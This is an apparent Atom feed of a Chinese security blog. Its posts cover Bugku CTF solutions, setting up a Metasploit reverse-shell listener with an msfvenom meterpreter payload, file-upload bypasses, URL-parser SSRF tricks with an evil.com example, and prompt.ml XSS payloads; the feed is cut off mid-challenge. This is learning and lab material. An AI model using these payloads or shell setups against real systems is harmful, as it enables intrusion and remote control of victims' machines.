<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>onekingcc&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://onekingcc.github.io/"/>
  <updated>2019-11-13T10:33:50.561Z</updated>
  <id>http://onekingcc.github.io/</id>
  
  <author>
    <name>onekingcc</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Bugku-ctf</title>
    <link href="http://onekingcc.github.io/2019/11/12/Bugku-ctf/"/>
    <id>http://onekingcc.github.io/2019/11/12/Bugku-ctf/</id>
    <published>2019-11-12T07:43:32.916Z</published>
    <updated>2019-11-13T10:33:50.561Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址：<a href="https://ctf.bugku.com/challenges" target="_blank" rel="noopener">https://ctf.bugku.com/challenges</a></p><p>这里只是做了部分题目还有很多题目没来的及。以后有空在写吧</p><h3 id="web2"><a href="#web2" class="headerlink" title="web2 :"></a>web2 :</h3><p>这里做一下一些基础题目巩固一下知识web2这里打开链接查看源代码可以直接拿到flag<img src="/images/bugctf/1573544169289.png" alt="1573544166418"></p><h3 id="计算器："><a href="#计算器：" class="headerlink" title="计算器："></a>计算器：</h3><p>这里发现输入的数据只能输入1位 然后审查元素发现maxlength=1这里直接修改代码为3</p><p><img src="/images/bugctf/1573544431438.png" alt="1573544431438"></p><p>最后直接拿到flag<img src="/images/bugctf/1573544492988.png" alt="1573544492988"></p><h3 id="web基础-GET"><a href="#web基础-GET" class="headerlink" title="web基础$_GET"></a>web基础$_GET</h3><p><img src="/images/bugctf/1573544632396.png" alt="1573544632396"></p><p>这里进来是可以直接看到代码的，可以看出当get过来的参数what=flag时 就可以拿到flag</p><p><img src="/images/bugctf/1573544935076.png" alt="1573544935076"></p><h3 id="web基础-POST"><a href="#web基础-POST" class="headerlink" title="web基础$_POST"></a>web基础$_POST</h3><p>这里跟get差不多的只是说这里请求方式是post方式的这里至于要构造表单 或者抓包 或者hackbar都可以</p><p><img src="/images/bugctf/1573545095593.png" alt="1573545095593"></p><p><img src="/images/bugctf/1573545396397.png" alt="1573545396397"></p><h3 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h3><p>这关进来也是直接看到代码</p><p><img src="/images/bugctf/1573545504676.png" alt="1573545504676"></p><p>这里发现要输出flag有个条件就是：is_numeric这个函数胡是检测变量是否为数字或数字字符串，这里必须要num这个变量不是数字和num为1才会输出flag，这里想到的是1加字符串。利用php的弱类型比较，双等于不会去判断类型的比较，这里还可以用科学计数的方法，让num这个值表示既是1也是不是纯数字。<img src="/images/bugctf/1573546075026.png" alt="1573546075026"></p><p><img src="/images/bugctf/1573546350802.png" alt="1573546350802"></p><h3 id="web3："><a href="#web3：" class="headerlink" title="web3："></a>web3：</h3><p>一直跳flag就在这里查看源代码发现<img src="/images/bugctf/1573547153016.png" alt="1573547153016"></p><p>这个应该是被实体编码了这里直接解码就可以得到flag<img src="/images/bugctf/1573547462880.png" alt="1573547462880"></p><h3 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h3><p>这里提示把flag.baidu.com解析到123.206.87.240这里windows下面可以直接拿到在<code>windows</code>下找到<code>c:/windows/system32/drivers/etc/host</code>文件<img src="/images/bugctf/1573547933407.png" alt="1573547933407"></p><p>按理说当我访问发个flag.bugku.com就可以拿到flag才对但是这里没有拿到  也不知道为啥，</p><h3 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h3><p>这里用burp不断的放包<img src="/images/bugctf/1573549220044.png" alt="1573549220044"></p><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p><img src="/images/bugctf/1573608043784.png" alt="1573608043784"></p><p>这里直接get一个参数打印一个全局看看，发现可以直接拿到flag</p><p><img src="/images/bugctf/1573614095258.png" alt="1573614095258"></p><h3 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h3><p><img src="/images/bugctf/1573614232232.png" alt="1573614232232"></p><p>这里直接查看源代码这里发现是这个，有点懵了  查了一下发现这是jsFuck</p><p><img src="/images/bugctf/1573614380215.png" alt="1573614380215">·</p><p><img src="/images/bugctf/1573631026743.png" alt="1573631026743"></p><h3 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h3><p><img src="/images/bugctf/1573636642491.png" alt="1573636642491"></p><p><img src="/images/bugctf/1573636497120.png" alt="1573636497120"></p><p><img src="/images/bugctf/1573636734712.png" alt="1573636734712"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;题目地址：&lt;a href=&quot;https://ctf.bugku.com/challenges&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://ctf.bugku.com/challenges&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这里只是做了部分题目还有很多
      
    
    </summary>
    
      <category term="ctf" scheme="http://onekingcc.github.io/categories/ctf/"/>
    
    
      <category term="bugctf" scheme="http://onekingcc.github.io/tags/bugctf/"/>
    
  </entry>
  
  <entry>
    <title>阿里云服务器搭建外网msf</title>
    <link href="http://onekingcc.github.io/2019/09/26/%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E5%A4%96%E7%BD%91msf/"/>
    <id>http://onekingcc.github.io/2019/09/26/阿里云服务器搭建外网msf/</id>
    <published>2019-09-26T08:35:48.573Z</published>
    <updated>2019-11-13T10:32:25.442Z</updated>
    
    <content type="html"><![CDATA[<h2 id="阿里云服务器搭建外网msf"><a href="#阿里云服务器搭建外网msf" class="headerlink" title="阿里云服务器搭建外网msf"></a>阿里云服务器搭建外网msf</h2><p>这里之所以写它，是因为之前买了台阿里云的服务器，搭建过程中也遇到了很多坑，这里使用的是xshell工具连接我的远程服务器，服务器的系统是Ubuntu 18.04，登录进去首先切换成root权限</p><h3 id="踩坑1"><a href="#踩坑1" class="headerlink" title="踩坑1"></a>踩坑1</h3><p>这里我之前只是将自己本机防火墙关闭，然后在监听的时候监听是能监听，但是我触发的可执行文件一直没有会话，忽略阿里云本身还有自带的防火墙，所以要将阿里云的服务器也关掉</p><h3 id="安装metasploit"><a href="#安装metasploit" class="headerlink" title="安装metasploit"></a>安装metasploit</h3><p>安装之前要看你的服务是否能够访问外网可以用<code>curl www.baidu.com</code>测试一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 获取MSF</span><br><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall</span><br><span class="line">chmod 755 msfinstall    // 修改权限</span><br><span class="line">./msfinstall    // 开始安装</span><br></pre></td></tr></table></figure><h3 id="安装Nmap"><a href="#安装Nmap" class="headerlink" title="安装Nmap"></a>安装Nmap</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install namp</span><br></pre></td></tr></table></figure><h3 id="安装postgresql"><a href="#安装postgresql" class="headerlink" title="安装postgresql"></a>安装postgresql</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt-get install postgresql  //安装postgresql数据库</span><br><span class="line">su postgres                 //切换到postgres用户</span><br><span class="line">psql                //登录数据库，首次登录没有密码</span><br><span class="line">\password postgres          //修改密码</span><br><span class="line">\q                          //退出</span><br></pre></td></tr></table></figure><h3 id="生成木马文件"><a href="#生成木马文件" class="headerlink" title="生成木马文件"></a>生成木马文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=外网ip LPORT=监听的端口 -f exe &gt;x64.exe</span><br></pre></td></tr></table></figure><p><img src="/images/shentouceshi/1569485138005.png" alt="1569485138005"></p><h3 id="启动msf"><a href="#启动msf" class="headerlink" title="启动msf"></a>启动msf</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole      //启动msf</span><br><span class="line">use exploit/multi/handler //监听</span><br><span class="line">set payload windows/x64/meterpreter/reverser_tcp //设置载荷</span><br><span class="line">set LHOST 0.0.0.0</span><br><span class="line">set LPORT //监听的端口</span><br><span class="line">exploit  //执行</span><br></pre></td></tr></table></figure><p><img src="/images/shentouceshi/1569485605886.png" alt="1569485605886"></p><p>这里将之前的生成的x64.exe执行文件放在我们的本机 ，本机执行这个文件，这时将被监听，新建一个会话将文件下载到本机<code>sz x64.exe</code></p><p><img src="/images/shentouceshi/1569486332944.png" alt="1569486332944"></p><p>这时我们就直接进入目标的shell</p><p><img src="/images/shentouceshi/1569486454599.png" alt="1569486454599"></p><p>查看目标机信息：</p><p><img src="/images/shentouceshi/1569487055550.png" alt="1569487055550"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里我的服务器生成exe，将exe下载到本地电脑，本地电脑相当于目标机器，exe就相当于一个反向链接程序，将流量转发到我的攻击机器上。</p><p>reference：<a href="http://ximcx.cn/post-117.html" target="_blank" rel="noopener">http://ximcx.cn/post-117.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;阿里云服务器搭建外网msf&quot;&gt;&lt;a href=&quot;#阿里云服务器搭建外网msf&quot; class=&quot;headerlink&quot; title=&quot;阿里云服务器搭建外网msf&quot;&gt;&lt;/a&gt;阿里云服务器搭建外网msf&lt;/h2&gt;&lt;p&gt;这里之所以写它，是因为之前买了台阿里云的服务器，搭建
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://onekingcc.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>文件上传漏洞</title>
    <link href="http://onekingcc.github.io/2019/09/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <id>http://onekingcc.github.io/2019/09/15/文件上传漏洞/</id>
    <published>2019-09-15T09:11:42.463Z</published>
    <updated>2019-09-15T09:15:04.555Z</updated>
    
    <content type="html"><![CDATA[<h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><p>前不久面试的时候面试官问了我一些文件上传，感觉答的不是很好，然后又去重新了解了一下，看了<strong>雨师傅</strong>写的文件上传，真的写的很好，这里我只写下一些基础的东西。 </p><p>在日常的业务场景中文件上传这个功能出现在很多的地方，比如文件上传，图片上传，但是在处理文件上传的时候没有进行过滤，这里的过滤是指的是没有进行任何文件的过滤然后就进行上传</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $file = $_FILES[<span class="string">'file'</span>];</span><br><span class="line">    move_uploaded_file($file[<span class="string">'tmp_name'</span>],$file[<span class="string">'name'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里使用move_uploaded_file()直接把临时上传的文件copy到新的文件中，就会导致任意文件上传，</p><h3 id="常见的绕过技巧"><a href="#常见的绕过技巧" class="headerlink" title="常见的绕过技巧"></a>常见的绕过技巧</h3><h4 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize"></a>getimagesize</h4><p>比如<code>getimagesize()</code>如果上传的是一个非图片的文件会被提示不是图片文件，但是如果在文件头里面添加“GIF89a”后上传则验证通过,返回图片的尺寸数组。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    print_r (getimagesize(<span class="string">'2.gif'</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/upload/1568355701285.png" alt="1568355701285"></p><p><img src="/images/upload/1568355859925.png" alt="1568355859925"></p><p>这种绕过的话就直接上传图片的时候在图片后面加上想要执行的php代码就可以绕过。</p><h4 id="00绕过"><a href="#00绕过" class="headerlink" title="00绕过"></a>00绕过</h4><p>00截断即是NULL会被gpc和addslashes函数过滤，要想使用00截断就需要没开起gpc以及没被addslashes过滤，之所以能够使用00截断使因为php是基于C语言开发的%00URL解码后就是C语言的/0，这里新建00.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"2.txt/000.jpg"</span>;</span><br></pre></td></tr></table></figure><p>测试文件2.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>php5.2.x版本解析00.php时会将2.txt/000.jpg解析为2.txt正常执行phpinfo代码</p><p><img src="/images/upload/1568517309671.png" alt="1568517309671"></p><h4 id="字符编码截断"><a href="#字符编码截断" class="headerlink" title="字符编码截断"></a>字符编码截断</h4><p>iconv()函数用来做字符编码转化，这个函数特性当它遇到不能处理的字符串时，后面将不进行处理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $test = <span class="string">'one'</span>.chr(<span class="number">200</span>).<span class="string">'onekingcc'</span>;</span><br><span class="line">    <span class="keyword">echo</span> $test;</span><br><span class="line">    <span class="keyword">echo</span>  <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> iconv(<span class="string">"UTF-8"</span>,<span class="string">"gbk"</span>,$test);</span><br><span class="line"><span class="comment">//$test = @iconv("UTF-8","gbk",$test);</span></span><br><span class="line">    <span class="comment">//var_dump($test);</span></span><br></pre></td></tr></table></figure><p>结果如下：</p><p><img src="/images/upload/1568533068549.png" alt="1568533068549"></p><p>测试发现在php版本为5.4.及以上的版本转化字符的时候会返回false</p><p><img src="/images/upload/1568533624373.png" alt="1568533624373"></p><p>这里当使用iconv()函数转化时候从chr(130)之后就没有输出会被截断</p><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ol><li>客户端检测，使用 js 对上传图片检测，包括文件大小、文件扩展名、文件类型等</li><li>服务端检测，对文件大小、文件路径、文件扩展名、文件类型、文件内容检测、对文件重命名等</li><li>其他限制，如服务器端上传目录设置不可执行权限</li><li>检查网站有没有文件解析漏洞和文件包含漏洞</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;文件上传漏洞&quot;&gt;&lt;a href=&quot;#文件上传漏洞&quot; class=&quot;headerlink&quot; title=&quot;文件上传漏洞&quot;&gt;&lt;/a&gt;文件上传漏洞&lt;/h2&gt;&lt;p&gt;前不久面试的时候面试官问了我一些文件上传，感觉答的不是很好，然后又去重新了解了一下，看了&lt;strong&gt;雨师
      
    
    </summary>
    
      <category term="web安全" scheme="http://onekingcc.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Abusing  URL Parsers</title>
    <link href="http://onekingcc.github.io/2019/09/05/Abusing%20%20URL%20Parsers/"/>
    <id>http://onekingcc.github.io/2019/09/05/Abusing  URL Parsers/</id>
    <published>2019-09-05T06:33:43.099Z</published>
    <updated>2019-09-05T06:38:33.639Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Abusing-URL-Parsers"><a href="#Abusing-URL-Parsers" class="headerlink" title="Abusing  URL Parsers"></a>Abusing  URL Parsers</h2><p>本文是基于作者：<strong>Orange</strong>的ppt的一些理解并记录下来，如有理解不当，还望斧正</p><p>原文地址：<a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$url = <span class="string">'http://'</span> . $_GET[url];</span><br><span class="line">$parsed = parse_url($url);</span><br><span class="line"><span class="keyword">if</span> ( $parsed[port] == <span class="number">80</span> &amp;&amp; $parsed[host] == <span class="string">'google.com'</span>) &#123;</span><br><span class="line">readfile($url);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'You Shall Not Pass'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里对传入的url进行解析，port如果为80端口,host为googel.com,然后就会执行readfile()这里的readfile()就可以用来实现ssrf攻击，这里要知道parse_url()是如何解析的。</p><p>官方说的parse_url函数解析的是一个 URL ，返回的是一个数组，包含在 URL 中出现的各种组成部分。这个函数<em>不是</em>用来验证给定 URL 的合法性的，只是将其分解为下面列出的部分。不完整的 URL 也被接受，<strong>parse_url()</strong>会尝试尽量正确地将其解析。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = <span class="string">'http://username:password@hostname/path?arg=value#anchor'</span>;</span><br><span class="line"></span><br><span class="line">print_r(parse_url($url));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> parse_url($url, PHP_URL_PATH);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>output:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array ( [scheme] =&gt; http [host] =&gt; hostname [user] =&gt; username [pass] =&gt; password [path] =&gt; /path [query] =&gt; arg=value [fragment] =&gt; anchor ) /path</span><br></pre></td></tr></table></figure><p><strong>scheme：代表访问的协议，一般为http或者https以及ftp</strong></p><p><strong>host：主机名，域名，比如：<a href="http://www.google.com。" target="_blank" rel="noopener">www.google.com。</a></strong></p><p><strong>user</strong>：<strong>用户</strong></p><p><strong>port</strong>：<strong>端口号</strong></p><p><strong>path</strong>：<strong>查找路径</strong></p><p><strong>query-string：查询字符串</strong></p><p><strong>anchor：锚点，后台一般不用管，前端用来做页面的定位的。</strong></p><p>当对本文的第一个php传入的url格式为：<a href="http://127.0.0.1:11211:80,对调用readfile()函数的时候解析的是11211端口而在PHP" target="_blank" rel="noopener">http://127.0.0.1:11211:80,对调用readfile()函数的时候解析的是11211端口而在PHP</a> 中的parse_url解析的是80 端口，这里就由于URL解析器跟url解析产生的差异造成ssrf利用。里面有张图说明的很清楚</p><p><img src="/images/urlparser/1567663898650.png" alt="1567663898650"></p><p>在文中还引入了FRC3986</p><p>RFC3986文档规定，Url中只允许包含以下四种：</p><p>​                   1、英文字母（a-zA-Z）</p><p>​                   2、数字（0-9）</p><p>​                   3、-_.~ 4个特殊字符</p><p>​                   4、所有保留字符，RFC3986中指定了以下字符为保留字符（英文字符）：     ! * ‘ ( ) ; : @ &amp; = + $ , / ? # [ ]</p><p><img src="/images/urlparser/1567664365902.png" alt="1567664365902"></p><p>这里如果构造<strong><a href="http://google.com/#@evil.com/" target="_blank" rel="noopener">http://google.com/#@evil.com/</a></strong>在php 中的parse_url解析的是googel.com,而readfile执行的是RFC的定义指向的是evil.com.</p><p><img src="/images/urlparser/1567664693428.png" alt="1567664693428"></p><p><strong>end</strong></p><p>这个ppt里面的内容有点丰富  [滑稽脸]</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Abusing-URL-Parsers&quot;&gt;&lt;a href=&quot;#Abusing-URL-Parsers&quot; class=&quot;headerlink&quot; title=&quot;Abusing  URL Parsers&quot;&gt;&lt;/a&gt;Abusing  URL Parsers&lt;/h2&gt;&lt;p&gt;
      
    
    </summary>
    
      <category term="web安全" scheme="http://onekingcc.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="url" scheme="http://onekingcc.github.io/tags/url/"/>
    
  </entry>
  
  <entry>
    <title>XSS Challenge</title>
    <link href="http://onekingcc.github.io/2019/08/27/XSS%20Challenge/"/>
    <id>http://onekingcc.github.io/2019/08/27/XSS Challenge/</id>
    <published>2019-08-27T08:40:06.410Z</published>
    <updated>2019-08-27T08:47:40.084Z</updated>
    
    <content type="html"><![CDATA[<h2 id="XSS-Challenge"><a href="#XSS-Challenge" class="headerlink" title="XSS Challenge"></a>XSS Challenge</h2><pre><code>今天无意中看见这个然后顺便做了一下，学到了很多，这里只是想记录一下做题的心得，当然有大佬早就写了write up可以看，从中真的会学到很多东西。</code></pre><p><strong>题目地址:<a href="http://prompt.ml/" target="_blank" rel="noopener">http://prompt.ml/</a></strong></p><h3 id="challenge-0"><a href="#challenge-0" class="headerlink" title="challenge 0"></a>challenge 0</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// warm up</span></span><br><span class="line">    <span class="comment">// script should be executed without user interaction</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;input type="text" value="'</span> + input + <span class="string">'"&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里没有任何过滤payload：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;img src = x onerror=prompt(1)&gt;</span></span><br></pre></td></tr></table></figure><h3 id="chanllenge-1"><a href="#chanllenge-1" class="headerlink" title="chanllenge 1"></a>chanllenge 1</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// tags stripping mechanism from ExtJS library</span></span><br><span class="line">    <span class="comment">// Ext.util.Format.stripTags</span></span><br><span class="line">    <span class="keyword">var</span> stripTagsRE = <span class="regexp">/&lt;\/?[^&gt;]+&gt;/gi</span>;</span><br><span class="line">    input = input.replace(stripTagsRE, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;article&gt;'</span> + input + <span class="string">'&lt;/article&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的<code>var stripTagsRE = /&lt;\/?[^&gt;]+&gt;/gi;</code>匹配&lt;&gt;包裹的内容把里面的东西relpace为空，然后过滤<strong>&gt;</strong>如果是<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>会变成alert(1),所以这里的思路就是不去闭合，让浏览器去容错处理</p><p>payload：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">prompt(1)//</span></span></span><br></pre></td></tr></table></figure><h3 id="challenge-2"><a href="#challenge-2" class="headerlink" title="challenge 2"></a>challenge 2</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//                      v-- frowny face</span></span><br><span class="line">    input = input.replace(<span class="regexp">/[=(]/g</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ok seriously, disallows equal signs and open parenthesis</span></span><br><span class="line">    <span class="keyword">return</span> input;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的将<strong>= 和(</strong>替换掉，这样常规的就会过不了  这里想到的是利用ES6通过模板字符串的标签模板，<code>&lt;script&gt;prompt&#39;1&#39;&lt;/script&gt;</code></p><p>但是还是没有弹，最后查了一下，这样传进去的是 *<em>字符串 *</em><code>&lt;script&gt;prompt.call${1}&lt;/script&gt;</code>不过最后也没弹，就换了种思路看看能不能试试编码，这里学到新知识，由于在xml特性中svg向量里面包含script标签元素，就会先对xml进行解析，然后这里通过编码 或者进制进行绕过，&amp;#40十进制，在html实体编码时会被还原成（</p><p>payload：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>prompt&amp;#40;1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="challenge-3"><a href="#challenge-3" class="headerlink" title="challenge 3"></a>challenge 3</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function escape(input) &#123;</span><br><span class="line">    // filter potential comment end delimiters</span><br><span class="line">    input = input.replace(/-&gt;/g, &apos;_&apos;);</span><br><span class="line"></span><br><span class="line">    // comment the input to avoid script execution</span><br><span class="line">    return &apos;&lt;!-- &apos; + input + &apos; --&gt;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里过滤了<strong>-&gt;</strong>可以用条件注释–!</p><p>payload:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--!&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">prompt(1)</span></span></span><br></pre></td></tr></table></figure><h3 id="challenge-4"><a href="#challenge-4" class="headerlink" title="challenge 4"></a>challenge 4</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// make sure the script belongs to own site</span></span><br><span class="line">    <span class="comment">// sample script: http://prompt.ml/js/test.js</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="regexp">/^(?:https?:)?\/\/prompt\.ml\//i</span>.test(<span class="built_in">decodeURIComponent</span>(input))) &#123;</span><br><span class="line">        <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">        script.src = input;</span><br><span class="line">        <span class="keyword">return</span> script.outerHTML;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Invalid resource.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里要用伪造url绕，访问的带有用户名，密码保护的url来伪造不过怎么构造好像也不行。</p><h3 id="challenge-5"><a href="#challenge-5" class="headerlink" title="challenge 5"></a>challenge 5</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// apply strict filter rules of level 0</span></span><br><span class="line">    <span class="comment">// filter "&gt;" and event handlers</span></span><br><span class="line">    input = input.replace(<span class="regexp">/&gt;|on.+?=|focus/gi</span>, <span class="string">'_'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;input value="'</span> + input + <span class="string">'" type="text"&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>/&gt;|on.+?=|focus/gi<code>替换了</code>&gt;<code>、</code>onxxxx=<code>和</code>focus这里采用换行的方式绕过</p><p>payload：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span 